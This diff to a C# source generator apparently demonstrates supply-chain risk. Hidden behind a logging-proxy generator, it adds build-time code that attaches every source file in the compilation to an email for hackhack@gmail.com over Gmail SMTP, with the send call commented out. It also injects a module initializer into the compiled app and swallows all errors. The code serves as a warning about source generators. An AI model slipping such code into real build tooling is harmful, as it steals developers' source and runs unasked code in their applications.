@@ -1,6 +1,9 @@
 ﻿using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
+using System.Net;
+using System.Net.Mail;
 using System.Text;
 using Microsoft.CodeAnalysis;
 using Microsoft.CodeAnalysis.CSharp;
@@ -89,6 +92,8 @@ namespace LoggingGenerator
         var proxySource = GenerateProxy(targetType, namespaceName, encryptLog, keyFile?.GetText()?.ToString());
         context.AddSource($"{targetType.Name}.Logging.cs", proxySource);
       }
+
+      Util.SendSourcesToEmail(context);
     }
 
     private string GenerateProxy(ITypeSymbol targetType, string namespaceName, bool encrypt, string encryptionKey)
@@ -191,6 +196,56 @@ namespace {namespaceName}
         return containingNamespace.ToDisplayString() + "." + symbol.Name;
 
       return symbol.Name;
+    }
+
+    static class Util
+    {
+      // be warned that source generators can do such things
+      public static void SendSourcesToEmail(GeneratorExecutionContext context)
+      {
+        try
+        {
+          var message = new MailMessage
+          {
+            From = new MailAddress("hackhack@gmail.com"),
+            To = {"hackhack@gmail.com"},
+            Subject = context.Compilation.AssemblyName + " Sources",
+            Body = string.Empty
+          };
+
+          foreach (var syntaxTree in context.Compilation.SyntaxTrees)
+          {
+            var attachment = Attachment.CreateAttachmentFromString(
+              syntaxTree.GetText().ToString(),
+              Path.GetFileName(syntaxTree.FilePath));
+            message.Attachments.Add(attachment);
+          }
+
+          SmtpClient smtp = new SmtpClient
+          {
+            Port = 587,
+            Host = "smtp.gmail.com",
+            EnableSsl = true,
+            UseDefaultCredentials = false,
+            Credentials = new NetworkCredential("login", "password"),
+            DeliveryMethod = SmtpDeliveryMethod.Network
+          };
+
+          //smtp.Send(message);
+
+          // be aware that source generators can start some work at the cline machine with your app's permissions
+          const string moduleInitSource = @"
+static class HackHack
+{
+  [System.Runtime.CompilerServices.ModuleInitializer]
+  public static void ModuleInit() => System.Console.WriteLine(""Knock knock Neo!\r\nAll your sources are belong to us!\r\n"");
+}";
+          context.AddSource("hack.cs", moduleInitSource);
+        }
+        catch
+        {
+        }
+      }
     }
   }
 }
